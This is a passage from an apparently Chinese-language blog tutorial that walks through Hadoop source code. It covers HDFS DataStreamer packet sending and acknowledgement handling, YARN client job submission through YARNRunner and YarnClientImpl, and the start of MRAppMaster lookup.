步骤二：启动ResponseProcessor用来监听packet发送是否成功</span></span><br><span class="line">      initDataStreaming();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (stage == BlockConstructionStage.PIPELINE_SETUP_APPEND) &#123;</span><br><span class="line">      LOG.debug(<span class="string">"Append to block &#123;&#125;"</span>, block);</span><br><span class="line">      setupPipelineForAppendOrRecovery();</span><br><span class="line">      <span class="keyword">if</span> (streamerClosed) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      initDataStreaming();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> lastByteOffsetInBlock = one.getLastByteOffsetBlock();</span><br><span class="line">    <span class="keyword">if</span> (lastByteOffsetInBlock &gt; stat.getBlockSize()) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"BlockSize "</span> + stat.getBlockSize() +</span><br><span class="line">        <span class="string">" &lt; lastByteOffsetInBlock, "</span> + <span class="keyword">this</span> + <span class="string">", "</span> + one);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (one.isLastPacketInBlock()) &#123;</span><br><span class="line">      <span class="comment">// wait for all data packets have been successfully acked</span></span><br><span class="line">      <span class="keyword">synchronized</span> (dataQueue) &#123;</span><br><span class="line">      <span class="keyword">while</span> (!shouldStop() &amp;&amp; ackQueue.size() != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// wait for acks to arrive from datanodes</span></span><br><span class="line">        dataQueue.wait(<span class="number">1000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException  e) &#123;</span><br><span class="line">        LOG.warn(<span class="string">"Caught exception"</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (shouldStop()) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      stage = BlockConstructionStage.PIPELINE_CLOSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// send the packet</span></span><br><span class="line">    SpanId spanId = SpanId.INVALID;</span><br><span class="line">    <span class="keyword">synchronized</span> (dataQueue) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// move packet from dataQueue to ackQueue</span></span><br><span class="line">      <span class="keyword">if</span> (!one.isHeartbeatPacket()) &#123;</span><br><span class="line">      <span class="keyword">if</span> (scope != <span class="keyword">null</span>) &#123;</span><br><span class="line">        spanId = scope.getSpanId();</span><br><span class="line">        scope.detach();</span><br><span class="line"></span><br><span class="line">        one.setTraceScope(scope);</span><br><span class="line">      &#125;</span><br><span class="line">      scope = <span class="keyword">null</span>;</span><br><span class="line">      <span class="comment">// 步骤三：从dataQueue 把要发送的这个packet 移除出去</span></span><br><span class="line">      dataQueue.removeFirst();</span><br><span class="line">      <span class="comment">// 步骤四：然后往ackQueue 里面添加这个packet</span></span><br><span class="line">      ackQueue.addLast(one);</span><br><span class="line">      packetSendTime.put(one.getSeqno(), Time.monotonicNow());</span><br><span class="line">      dataQueue.notifyAll();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    LOG.debug(<span class="string">"&#123;&#125; sending &#123;&#125;"</span>, <span class="keyword">this</span>, one);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// write out data to remote datanode</span></span><br><span class="line">    <span class="keyword">try</span> (TraceScope ignored = dfsClient.getTracer().</span><br><span class="line">      newScope(<span class="string">"DataStreamer#writeTo"</span>, spanId)) &#123;</span><br><span class="line">      <span class="comment">//  将数据写出去</span></span><br><span class="line">      one.writeTo(blockStream);</span><br><span class="line">      blockStream.flush();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">      errorState.markFirstNodeIfNotMarked();</span><br><span class="line">      <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line">    lastPacket = Time.monotonicNow();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// update bytesSent</span></span><br><span class="line">    <span class="keyword">long</span> tmpBytesSent = one.getLastByteOffsetBlock();</span><br><span class="line">    <span class="keyword">if</span> (bytesSent &lt; tmpBytesSent) &#123;</span><br><span class="line">      bytesSent = tmpBytesSent;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (shouldStop()) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is this block full?</span></span><br><span class="line">    <span class="keyword">if</span> (one.isLastPacketInBlock()) &#123;</span><br><span class="line">      <span class="comment">// wait for the close packet has been acked</span></span><br><span class="line">      <span class="keyword">synchronized</span> (dataQueue) &#123;</span><br><span class="line">      <span class="keyword">while</span> (!shouldStop() &amp;&amp; ackQueue.size() != <span class="number">0</span>) &#123;</span><br><span class="line">        dataQueue.wait(<span class="number">1000</span>);<span class="comment">// wait for acks to arrive from datanodes</span></span><br><span class="line">      &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (shouldStop()) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      endBlock();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (progress != <span class="keyword">null</span>) &#123; progress.progress(); &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// This is used by unit test to trigger race conditions.</span></span><br><span class="line">    <span class="keyword">if</span> (artificialSlowdown != <span class="number">0</span> &amp;&amp; dfsClient.clientRunning) &#123;</span><br><span class="line">      Thread.sleep(artificialSlowdown);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">    ... ...</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (scope != <span class="keyword">null</span>) &#123;</span><br><span class="line">      scope.close();</span><br><span class="line">      scope = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  closeInternal();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">initDataStreaming</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.setName(<span class="string">"DataStreamer for file "</span> + src +</span><br><span class="line">      <span class="string">" block "</span> + block);</span><br><span class="line">  ... ...</span><br><span class="line">  response = <span class="keyword">new</span> ResponseProcessor(nodes);</span><br><span class="line">  response.start();</span><br><span class="line">  stage = BlockConstructionStage.DATA_STREAMING;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>点击response再点击ResponseProcessor，ctrl + f 查找run方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ... ...</span><br><span class="line">  ackQueue.removeFirst();</span><br><span class="line">  packetSendTime.remove(seqno);</span><br><span class="line">  dataQueue.notifyAll();</span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>五、Yarn源码解析</h1><h2 id="1、概述-v4">1、概述</h2><p>YARN工作机制</p><p><img src="http://qnypic.shawncoding.top/blog/202401251335075.png" alt></p><p>yarn源码解析</p><p><img src="http://qnypic.shawncoding.top/blog/202401251335076.png" alt></p><h2 id="2、Yarn客户端向RM提交作业">2、Yarn客户端向RM提交作业</h2><p>在wordcount程序的驱动类中点击</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">boolean</span> result = job.waitForCompletion(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">waitForCompletion</span><span class="params">(<span class="keyword">boolean</span> verbose</span></span></span><br><span class="line"><span class="function"><span class="params">                                 )</span> <span class="keyword">throws</span> IOException, InterruptedException,</span></span><br><span class="line"><span class="function">                                          ClassNotFoundException </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (state == JobState.DEFINE) &#123;</span><br><span class="line">    submit();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (verbose) &#123;</span><br><span class="line">    monitorAndPrintJob();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// get the completion poll interval from the client.</span></span><br><span class="line">    <span class="keyword">int</span> completionPollIntervalMillis = </span><br><span class="line">      Job.getCompletionPollInterval(cluster.getConf());</span><br><span class="line">    <span class="keyword">while</span> (!isComplete()) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        Thread.sleep(completionPollIntervalMillis);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (InterruptedException ie) &#123;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> isSuccessful();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">submit</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">       <span class="keyword">throws</span> IOException, InterruptedException, ClassNotFoundException </span>&#123;</span><br><span class="line">  ensureState(JobState.DEFINE);</span><br><span class="line">  setUseNewAPI();</span><br><span class="line">  connect();</span><br><span class="line">  <span class="keyword">final</span> JobSubmitter submitter = </span><br><span class="line">      getJobSubmitter(cluster.getFileSystem(), cluster.getClient());</span><br><span class="line">  status = ugi.doAs(<span class="keyword">new</span> PrivilegedExceptionAction&lt;JobStatus&gt;() &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> JobStatus <span class="title">run</span><span class="params">()</span> <span class="keyword">throws</span> IOException, InterruptedException, </span></span><br><span class="line"><span class="function">    ClassNotFoundException </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> submitter.submitJobInternal(Job.<span class="keyword">this</span>, cluster);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  state = JobState.RUNNING;</span><br><span class="line">  LOG.info(<span class="string">"The url to track the job: "</span> + getTrackingURL());</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="function">JobStatus <span class="title">submitJobInternal</span><span class="params">(Job job, Cluster cluster)</span> </span></span><br><span class="line"><span class="function">  <span class="keyword">throws</span> ClassNotFoundException, InterruptedException, IOException </span>&#123;</span><br><span class="line">  ... ...</span><br><span class="line">  status = submitClient.submitJob(</span><br><span class="line">          jobId, submitJobDir.toString(), job.getCredentials()); </span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> JobStatus <span class="title">submitJob</span><span class="params">(JobID jobId, String jobSubmitDir, Credentials ts)</span> <span class="keyword">throws</span> IOException, InterruptedException</span>;</span><br></pre></td></tr></table></figure><p>创建提交环境，ctrl + alt +B 查找submitJob实现类，YARNRunner.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> JobStatus <span class="title">submitJob</span><span class="params">(JobID jobId, String jobSubmitDir, Credentials ts)</span></span></span><br><span class="line"><span class="function"><span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line">  </span><br><span class="line">  addHistoryToken(ts);</span><br><span class="line">  <span class="comment">// 创建提交环境：</span></span><br><span class="line">  ApplicationSubmissionContext appContext =</span><br><span class="line">    createApplicationSubmissionContext(conf, jobSubmitDir, ts);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Submit to ResourceManager</span></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 向RM提交一个应用程序，appContext里面封装了启动mrappMaster和运行container的命令</span></span><br><span class="line">    ApplicationId applicationId =</span><br><span class="line">        resMgrDelegate.submitApplication(appContext);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 获取提交响应</span></span><br><span class="line">    ApplicationReport appMaster = resMgrDelegate</span><br><span class="line">        .getApplicationReport(applicationId);</span><br><span class="line">    </span><br><span class="line">    String diagnostics =</span><br><span class="line">        (appMaster == <span class="keyword">null</span> ?</span><br><span class="line">            <span class="string">"application report is null"</span> : appMaster.getDiagnostics());</span><br><span class="line">    <span class="keyword">if</span> (appMaster == <span class="keyword">null</span></span><br><span class="line">        || appMaster.getYarnApplicationState() == YarnApplicationState.FAILED</span><br><span class="line">        || appMaster.getYarnApplicationState() == YarnApplicationState.KILLED) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"Failed to run job : "</span> +</span><br><span class="line">          diagnostics);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> clientCache.getClient(jobId).getJobStatus(jobId);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (YarnException e) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> IOException(e);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> ApplicationSubmissionContext <span class="title">createApplicationSubmissionContext</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    Configuration jobConf, String jobSubmitDir, Credentials ts)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  ApplicationId applicationId = resMgrDelegate.getApplicationId();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Setup LocalResources</span></span><br><span class="line">  <span class="comment">// 封装了本地资源相关路径</span></span><br><span class="line">  Map&lt;String, LocalResource&gt; localResources =</span><br><span class="line">      setupLocalResources(jobConf, jobSubmitDir);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Setup security tokens</span></span><br><span class="line">  DataOutputBuffer dob = <span class="keyword">new</span> DataOutputBuffer();</span><br><span class="line">  ts.writeTokenStorageToStream(dob);</span><br><span class="line">  ByteBuffer securityTokens =</span><br><span class="line">      ByteBuffer.wrap(dob.getData(), <span class="number">0</span>, dob.getLength());</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Setup ContainerLaunchContext for AM container</span></span><br><span class="line">  <span class="comment">// 封装了启动mrappMaster和运行container的命令</span></span><br><span class="line">  List&lt;String&gt; vargs = setupAMCommand(jobConf);</span><br><span class="line">  ContainerLaunchContext amContainer = setupContainerLaunchContextForAM(</span><br><span class="line">      jobConf, localResources, securityTokens, vargs);</span><br><span class="line"></span><br><span class="line">  ... ...</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> appContext;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> List&lt;String&gt; <span class="title">setupAMCommand</span><span class="params">(Configuration jobConf)</span> </span>&#123;</span><br><span class="line">  List&lt;String&gt; vargs = <span class="keyword">new</span> ArrayList&lt;&gt;(<span class="number">8</span>);</span><br><span class="line">  <span class="comment">// Java进程启动命令开始</span></span><br><span class="line">  vargs.add(MRApps.crossPlatformifyMREnv(jobConf, Environment.JAVA_HOME)</span><br><span class="line">      + <span class="string">"/bin/java"</span>);</span><br><span class="line"></span><br><span class="line">  Path amTmpDir =</span><br><span class="line">      <span class="keyword">new</span> Path(MRApps.crossPlatformifyMREnv(conf, Environment.PWD),</span><br><span class="line">          YarnConfiguration.DEFAULT_CONTAINER_TEMP_DIR);</span><br><span class="line">  vargs.add(<span class="string">"-Djava.io.tmpdir="</span> + amTmpDir);</span><br><span class="line">  MRApps.addLog4jSystemProperties(<span class="keyword">null</span>, vargs, conf);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check for Java Lib Path usage in MAP and REDUCE configs</span></span><br><span class="line">  warnForJavaLibPath(conf.get(MRJobConfig.MAP_JAVA_OPTS, <span class="string">""</span>),</span><br><span class="line">      <span class="string">"map"</span>,</span><br><span class="line">      MRJobConfig.MAP_JAVA_OPTS,</span><br><span class="line">      MRJobConfig.MAP_ENV);</span><br><span class="line">  warnForJavaLibPath(conf.get(MRJobConfig.MAPRED_MAP_ADMIN_JAVA_OPTS, <span class="string">""</span>),</span><br><span class="line">      <span class="string">"map"</span>,</span><br><span class="line">      MRJobConfig.MAPRED_MAP_ADMIN_JAVA_OPTS,</span><br><span class="line">      MRJobConfig.MAPRED_ADMIN_USER_ENV);</span><br><span class="line">  warnForJavaLibPath(conf.get(MRJobConfig.REDUCE_JAVA_OPTS, <span class="string">""</span>),</span><br><span class="line">      <span class="string">"reduce"</span>,</span><br><span class="line">      MRJobConfig.REDUCE_JAVA_OPTS,</span><br><span class="line">      MRJobConfig.REDUCE_ENV);</span><br><span class="line">  warnForJavaLibPath(conf.get(MRJobConfig.MAPRED_REDUCE_ADMIN_JAVA_OPTS, <span class="string">""</span>),</span><br><span class="line">      <span class="string">"reduce"</span>,</span><br><span class="line">      MRJobConfig.MAPRED_REDUCE_ADMIN_JAVA_OPTS,</span><br><span class="line">      MRJobConfig.MAPRED_ADMIN_USER_ENV);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Add AM admin command opts before user command opts</span></span><br><span class="line">  <span class="comment">// so that it can be overridden by user</span></span><br><span class="line">  String mrAppMasterAdminOptions = conf.get(MRJobConfig.MR_AM_ADMIN_COMMAND_OPTS,</span><br><span class="line">      MRJobConfig.DEFAULT_MR_AM_ADMIN_COMMAND_OPTS);</span><br><span class="line">  warnForJavaLibPath(mrAppMasterAdminOptions, <span class="string">"app master"</span>,</span><br><span class="line">      MRJobConfig.MR_AM_ADMIN_COMMAND_OPTS, MRJobConfig.MR_AM_ADMIN_USER_ENV);</span><br><span class="line">  vargs.add(mrAppMasterAdminOptions);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Add AM user command opts 用户命令参数</span></span><br><span class="line">  String mrAppMasterUserOptions = conf.get(MRJobConfig.MR_AM_COMMAND_OPTS,</span><br><span class="line">      MRJobConfig.DEFAULT_MR_AM_COMMAND_OPTS);</span><br><span class="line">  warnForJavaLibPath(mrAppMasterUserOptions, <span class="string">"app master"</span>,</span><br><span class="line">      MRJobConfig.MR_AM_COMMAND_OPTS, MRJobConfig.MR_AM_ENV);</span><br><span class="line">  vargs.add(mrAppMasterUserOptions);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (jobConf.getBoolean(MRJobConfig.MR_AM_PROFILE,</span><br><span class="line">      MRJobConfig.DEFAULT_MR_AM_PROFILE)) &#123;</span><br><span class="line">    <span class="keyword">final</span> String profileParams = jobConf.get(MRJobConfig.MR_AM_PROFILE_PARAMS,</span><br><span class="line">        MRJobConfig.DEFAULT_TASK_PROFILE_PARAMS);</span><br><span class="line">    <span class="keyword">if</span> (profileParams != <span class="keyword">null</span>) &#123;</span><br><span class="line">      vargs.add(String.format(profileParams,</span><br><span class="line">          ApplicationConstants.LOG_DIR_EXPANSION_VAR + Path.SEPARATOR</span><br><span class="line">              + TaskLog.LogName.PROFILE));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 封装了要启动的mrappmaster全类名 </span></span><br><span class="line">  <span class="comment">// org.apache.hadoop.mapreduce.v2.app.MRAppMaster</span></span><br><span class="line">  vargs.add(MRJobConfig.APPLICATION_MASTER_CLASS);</span><br><span class="line">  vargs.add(<span class="string">"1&gt;"</span> + ApplicationConstants.LOG_DIR_EXPANSION_VAR +</span><br><span class="line">      Path.SEPARATOR + ApplicationConstants.STDOUT);</span><br><span class="line">  vargs.add(<span class="string">"2&gt;"</span> + ApplicationConstants.LOG_DIR_EXPANSION_VAR +</span><br><span class="line">      Path.SEPARATOR + ApplicationConstants.STDERR);</span><br><span class="line">  <span class="keyword">return</span> vargs;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>向Yarn提交，点击submitJob方法中的submitApplication()，ctrl + alt +B 查找submitApplication实现类，YarnClientImpl.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ApplicationId</span><br><span class="line">    submitApplication(ApplicationSubmissionContext appContext)</span><br><span class="line">        <span class="keyword">throws</span> YarnException, IOException &#123;</span><br><span class="line">  ApplicationId applicationId = appContext.getApplicationId();</span><br><span class="line">  <span class="keyword">if</span> (applicationId == <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> ApplicationIdNotProvidedException(</span><br><span class="line">        <span class="string">"ApplicationId is not provided in ApplicationSubmissionContext"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 创建一个提交请求</span></span><br><span class="line">  SubmitApplicationRequest request =</span><br><span class="line">      Records.newRecord(SubmitApplicationRequest<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">  request.setApplicationSubmissionContext(appContext);</span><br><span class="line">  ... ...</span><br><span class="line"></span><br><span class="line">  <span class="comment">//<span class="doctag">TODO:</span> YARN-1763:Handle RM failovers during the submitApplication call.</span></span><br><span class="line">  <span class="comment">// 继续提交，实现类是ApplicationClientProtocolPBClientImpl</span></span><br><span class="line">  rmClient.submitApplication(request);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> pollCount = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">long</span> startTime = System.currentTimeMillis();</span><br><span class="line">  EnumSet&lt;YarnApplicationState&gt; waitingStates = </span><br><span class="line">                               EnumSet.of(YarnApplicationState.NEW,</span><br><span class="line">                               YarnApplicationState.NEW_SAVING,</span><br><span class="line">                               YarnApplicationState.SUBMITTED);</span><br><span class="line">  EnumSet&lt;YarnApplicationState&gt; failToSubmitStates = </span><br><span class="line">                                EnumSet.of(YarnApplicationState.FAILED,</span><br><span class="line">                                YarnApplicationState.KILLED);    </span><br><span class="line">  <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 获取提交给Yarn的反馈</span></span><br><span class="line">      ApplicationReport appReport = getApplicationReport(applicationId);</span><br><span class="line">      YarnApplicationState state = appReport.getYarnApplicationState();</span><br><span class="line">      ... ...</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ApplicationNotFoundException ex) &#123;</span><br><span class="line">      <span class="comment">// FailOver or RM restart happens before RMStateStore saves</span></span><br><span class="line">      <span class="comment">// ApplicationState</span></span><br><span class="line">      LOG.info(<span class="string">"Re-submit application "</span> + applicationId + <span class="string">"with the "</span> +</span><br><span class="line">          <span class="string">"same ApplicationSubmissionContext"</span>);</span><br><span class="line">    <span class="comment">// 如果提交失败，则再次提交</span></span><br><span class="line">      rmClient.submitApplication(request);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> applicationId;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3、RM启动MRAppMaster">3、RM启动MRAppMaster</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hadoop<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hadoop-mapreduce-client-app<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>查找MRAppMaster，搜索main方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 